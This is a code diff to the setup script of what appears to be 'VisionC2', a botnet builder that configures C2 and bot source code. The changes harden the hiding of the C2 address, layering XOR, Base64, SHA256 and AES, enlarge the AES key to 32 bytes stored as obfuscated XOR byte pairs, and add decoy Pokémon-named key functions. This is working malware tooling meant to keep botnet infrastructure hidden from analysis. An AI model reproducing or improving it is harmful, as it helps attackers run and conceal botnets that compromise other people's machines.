@@ -4,7 +4,7 @@ VisionC2 - Interactive Setup Script
 ====================================
 Automates the complete setup process:
 - Generates random protocol version and magic code
-- Obfuscates C2 address using XOR+Base64
+- Obfuscates C2 address using XOR+Base64+SHA256+AES
 - Generates TLS certificates
 - Updates CNC and Bot source code
 - Builds all components
@@ -173,10 +173,10 @@ def generate_crypt_seed() -> str:
 
 def derive_key_py(seed: str) -> bytes:
     """Python implementation of key derivation (must match Go charizard()).
-    Reads the AES key from opsec.go dynamically."""
+    Uses first 16 bytes of the garuda key (charizard only uses the original 16 pokemon)."""
     import hashlib
 
-    dk = garuda_key()
+    dk = garuda_key()[:16]
 
     h = hashlib.md5()
     h.update(seed.encode())
@@ -196,6 +196,10 @@ KEY_FUNC_NAMES = [
     "mew", "mewtwo", "celebi", "jirachi", "shaymin", "phione",
     "manaphy", "victini", "keldeo", "meloetta", "genesect",
     "diancie", "hoopa", "volcanion", "magearna", "marshadow",
+    "zeraora", "zarude", "regieleki", "regidrago", "glastrier",
+    "spectrier", "calyrex", "wyrdeer", "kleavor", "ursaluna",
+    "basculegion", "sneasler", "overqwil", "enamorus", "tinkaton",
+    "annihilape",
 ]
 
 
@@ -216,7 +220,7 @@ def read_current_key(opsec_path: str) -> bytes:
 
 
 def garuda_key() -> bytes:
-    """Return the raw 16-byte AES key used by garuda() in opsec.go.
+    """Return the raw 32-byte AES-256 key used by garuda() in opsec.go.
     Reads dynamically from opsec.go XOR byte pairs."""
     base_path = os.path.dirname(os.path.abspath(__file__))
     opsec_path = os.path.join(base_path, "bot", "opsec.go")
@@ -224,9 +228,9 @@ def garuda_key() -> bytes:
 
 
 def generate_random_key():
-    """Generate a random 16-byte AES key and XOR operand pairs that produce it.
-    Returns (key_bytes, [(A1,B1), (A2,B2), ..., (A16,B16)])"""
-    key_bytes = os.urandom(16)
+    """Generate a random 32-byte AES-256 key and XOR operand pairs that produce it.
+    Returns (key_bytes, [(A1,B1), (A2,B2), ..., (A32,B32)])"""
+    key_bytes = os.urandom(32)
     pairs = []
     for k in key_bytes:
         a = random.randint(0, 255)
